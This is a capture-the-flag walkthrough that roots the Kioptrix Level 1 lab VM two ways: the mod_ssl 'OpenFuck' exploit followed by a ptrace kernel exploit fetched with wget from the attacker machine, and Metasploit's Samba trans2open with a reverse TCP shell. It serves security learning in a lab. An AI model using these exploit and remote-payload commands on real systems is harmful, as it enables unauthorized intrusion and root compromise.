# Level 1

This is my first time solving VulHub Machine In this Walkthrough I found two ways to get root ( also I tried other ways for eg. using SUIDS but no able to succeed that way ). Also I used Ai for Writing this Writeup

### Phase 1: Reconnaissance & Enumeration

Every attack starts with information gathering. The first steps are to identify my own machine and then find the target on the network.

#### Step 1: Network Discovery

First, I confirmed my own IP address.

```bash
ip a
```

```bash
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    ...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:b4:a1:05 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.3/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0
       valid_lft 506sec preferred_lft 506sec
...
```

My attacker IP is `10.0.2.3`. Now, a quick `nmap` ping scan to discover all live hosts in the `10.0.2.0/24` subnet.

```bash
nmap -sn 10.0.2.3/24
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 20:26 IST
Nmap scan report for 10.0.2.1
Host is up (0.00065s latency).
...
Nmap scan report for 10.0.2.2
Host is up (0.00042s latency).
...
Nmap scan report for 10.0.2.15
Host is up (0.0022s latency).
...
Nmap scan report for 10.0.2.3
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.63 seconds
```

The target machine is confirmed at **`10.0.2.15`**.

#### Step 2: Port Scanning and Service Identification

Time for a deep dive. I used `rustscan` for speed, piping the discovered ports directly into `nmap` for detailed service analysis.

```bash
rustscan -a 10.0.2.15 -b 500 -t 5000 -- -A -sC -sV
```

```bash
Open 10.0.2.15:22
Open 10.0.2.15:80
Open 10.0.2.15:111
Open 10.0.2.15:139
Open 10.0.2.15:443
Open 10.0.2.15:32768
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-26 16:32 UTC
...
Nmap scan report for 192.168.1.31
Host is up (0.00027s latency).
Not shown: 65529 closed tcp ports (reset)

PORT      STATE SERVICE     VERSION

22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 b8746cdbfd8be666e92a2bdf5e6f6486 (RSA1)
|   1024 8f8e5b81ed21abc180e157a33c85c471 (DSA)
|_  1024 ed4ea94a0614ff1514ceda3a80dbe281 (RSA)

80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-title: Test Page for the Apache Web Server on Red Hat Linux

111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status

139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)

443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-09-26T09:32:06
| Not valid after:  2010-09-26T09:32:06
| MD5:   78ce52934723e7fec28d74ab42d702f1
|_SHA-1: 9c4291c3bed2a95b983d10acf766ecb987661d33
|_ssl-date: 2023-04-05T18:01:52+00:00; +3h59m59s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|_    SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-title: 400 Bad Request

32768/tcp open  status      1 (RPC #100024)

MAC Address: 08:00:27:1F:EB:7A (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Uptime guess: 0.047 days (since Wed Apr  5 14:54:46 2023)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: 3h59m58s
|_smb2-time: Protocol negotiation failed (SMB2)
| nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| Names:
|   KIOPTRIX<00>         Flags: <unique><active>
|   KIOPTRIX<03>         Flags: <unique><active>
|   KIOPTRIX<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   MYGROUP<00>          Flags: <group><active>
|   MYGROUP<1d>          Flags: <unique><active>
|_  MYGROUP<1e>          Flags: <group><active>

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.1.31
```

The scan reveals a host of ancient services. My main points of interest are **Samba (139)**, **HTTP (80)**, and **HTTPS (443)** due to their notoriously vulnerable old versions.

#### Step 3: Enumerating Services (The Rabbit Holes)

Before jumping to exploitation, I performed deeper enumeration on the most promising services.

**Samba Enumeration with `enum4linux`**

Samba is a great place to start looking for information. I ran `enum4linux` with the `-a` flag for an all-out enumeration.

```bash
enum4linux -a 10.0.2.15
```

```bash
 =========================================( Target Information )=========================================
Target ........... 10.0.2.15
...
 =============================( Enumerating Workgroup/Domain on 10.0.2.15 )=============================
[+] Got domain/workgroup name: MYGROUP
...
 =====================================( Session Check on 10.0.2.15 )=====================================
[+] Server 10.0.2.15 allows sessions using username '', password ''
...
 ===================================( Share Enumeration on 10.0.2.15 )===================================
        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
...
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
...
tree connect failed: NT_STATUS_WRONG_PASSWORD
...
```

The tool confirmed a null session was possible but failed to list any accessible shares. The RID cycling found some local users and groups, but nothing immediately actionable. **Conclusion: A dead end for now, but good information to have.**

**Web Enumeration with `dirsearch` and `nikto`**

Next, I turned to the web server on port 80. I started with `dirsearch` to find hidden directories.

```bash
dirsearch -u http://10.0.2.15/
```

```bash
[09:02:50] 301 -  294B  - /manual  ->  http://127.0.0.1/manual/             
[09:02:52] 200 -   17KB - /mrtg/                                            
[09:03:06] 200 -   27B  - /test.php                                         
[09:03:08] 301 -  293B  - /usage  ->  http://127.0.0.1/usage/               
```

I found a few directories like `/mrtg` and a `test.php` file, but manual inspection didn't reveal any vulnerabilities.

Next, I used `nikto` for an automated vulnerability scan. This was far more fruitful.

```bash
nikto -h http://10.0.2.15/
```

```bash
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.0.2.15
+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
...
+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7).
+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6).
+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54).
+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell.
...
```

**This is the jackpot.** `nikto` explicitly flags `mod_ssl/2.8.4` as vulnerable to a remote buffer overflow that can lead to a remote shell. This became my primary attack vector for the first method.

### Path #1: Exploitation via Apache/mod\_ssl

Armed with the `nikto` finding, I searched for an exploit for `mod_ssl 2.8.4` and found the "OpenFuck" script (Exploit-DB: 47080).

#### Step 1: Gaining Initial Access

I downloaded the C file, compiled it, and ran it against the target's HTTPS port (443).

```bash
./OpenFuck 0x6b 10.0.2.15 443 -c 50

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
...
Connection... 50 of 50
Establishing SSL connection
...
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

Success! I have a low-privilege shell as the `apache` user.

#### Step 2: Privilege Escalation

The exploit tried to auto-escalate by downloading a second exploit, but failed due to the target's lack of internet connectivity.

```bash
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--10:43:40--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
Unable to establish SSL connection.
gcc: ptrace-kmod.c: No such file or directory
```

This requires a manual approach. I hosted the exploit (`priv.c`, which is the `ptrace-kmod.c` file) on my own machine and used the victim shell to download and execute it.

1.  **Host the exploit file on the Kali machine:**



    ```bash
    # On Kali, in the directory with the exploit C file
    python3 -m http.server 8000
    ```
2.  **Download the file on the target machine:**



    ```bash
    # On the Kioptrix shell
    cd /tmp
    wget http://10.0.2.3:8000/priv.c
    ```
3.  **Compile the exploit on the target:**



    ```bash
    # On the Kioptrix shell
    gcc priv.c -o priv
    chmod +x priv
    ```
4.  **Executing for Root**

    With the exploit compiled, the final step was to run it.



    ```bash
    # On the Kioptrix shell
    ./priv
    ```



    ```bash
    [+] Attached to 1369
    [+] Waiting for signal
    [+] Signal caught
    [+] Shellcode placed at 0x4001189d
    [+] Now wait for suid shell...
    id
    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
    ```


5.  **Success!** The kernel exploit executed successfully, providing a root shell.



    ```bash
    pwd
    /root
    whoami
    root
    ```

### Path #2: Exploitation via Samba (The Hard Way)

For this method, I focused on port 139. My initial `nmap` vulnerability scan pointed me in the wrong direction.

```bash
nmap -p 139 --script=vuln 10.0.2.15
```

```bash
...
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103...
...
```

Trusting this, I went down a rabbit hole trying to use a public Python exploit for a Windows vulnerability. **This entire section is a showcase of what happens when your initial recon is slightly off.**

#### The Python Script Struggle

I downloaded a script named `MS09_050.py` and tried to run it. It was a painful process.

**Failure 1: Python 3 Syntax Error**

```bash
python3 MS09_050.py
```

```bash
  File "/home/kali/.../MS09_050.py", line 17
    print '\nUsage: %s <target ip>\n' % sys.argv[0]
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
SyntaxError: Missing parentheses in call to 'print'.
```

**Failure 2: Python 2 Missing Module**

```bash
python2 MS09_050.py 10.0.2.15
```

```bash
Traceback (most recent call last):
  File "MS09_050.py", line 10, in <module>
    from smb.SMBConnection import SMBConnection
ImportError: No module named smb.SMBConnection
```

**Failure 3: Dependency Hell** I then tried to install the missing `pysmb` library, battling with `pip` and modern Kali's `externally-managed-environment` protections.

```bash
sudo pip install pysmb
error: externally-managed-environment
...
```

Even after creating a virtual environment and installing the package, the script, being run with `python2`, couldn't see the library installed in the `python3` `venv`. The entire effort was a frustrating dead end that culminated in the script (even after being fixed) failing to connect or exploit the service.

#### The Metasploit Solution (Correct Solution) :

After the manual attempt failed spectacularly, I turned to the Metasploit Framework.

**Step 1: Get the&#x20;**_**Correct**_**&#x20;Samba Version**&#x20;

This is the most critical step I should have done first.

```bash
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(...) > set rhosts 10.0.2.15
msf auxiliary(...) > set rport 139
msf auxiliary(...) > run
[*] 10.0.2.15:139 - Host could not be identified: Unix (Samba 2.2.1a)
```

The true version is **Samba 2.2.1a**. Now I can find the correct exploit.

**Step 2: Use the `trans2open` Exploit**&#x20;

A search revealed `exploit/linux/samba/trans2open`. I configured it, but the initial run with the default `meterpreter` payload failed because the service was too unstable.

```bash
msf exploit(linux/samba/trans2open) > run
[*] Started reverse TCP handler on 10.0.2.3:4444 
[*] 10.0.2.15:139 - Trying return address 0xbffffdfc...
[*] Sending stage (1062760 bytes) to 10.0.2.15
[*] 10.0.2.15 - Meterpreter session 1 closed.  Reason: Died
[-] Meterpreter session 1 is not valid and will be closed
...
^C[-] Exploit failed [user-interrupt]: Interrupt
```

The output shows the exploit connecting, sending the payload, but the session immediately dying. This happened over and over.

**Step 3: Switch to a Stable Payload** The solution is to use a simpler, non-staged shell payload.

```bash
msf exploit(linux/samba/trans2open) > set payload linux/x86/shell_reverse_tcp
payload => linux/xx86/shell_reverse_tcp
msf exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 10.0.2.3:4444 
[*] 10.0.2.15:139 - Trying return address 0xbffff6fc...
[*] Command shell session 5 opened (10.0.2.3:4444 -> 10.0.2.15:32783) at ...

id
uid=0(root) gid=0(root) groups=99(nobody)
whoami
root
```

**Direct root shell.** This method, once the correct information was gathered, was much faster and required no separate privilege escalation.

### Final Thoughts

This CTF was an excellent lesson in methodology. The key takeaways were:

* **Trust but Verify:** An `nmap` script pointed me down a long, useless path. Always seek to confirm your findings, especially with a specific version scan.
* **The Struggle is Informative:** My failures with the Python script taught me more about troubleshooting legacy code and environment issues than a clean exploit ever would have.

Thank you for reading ☺️ ..
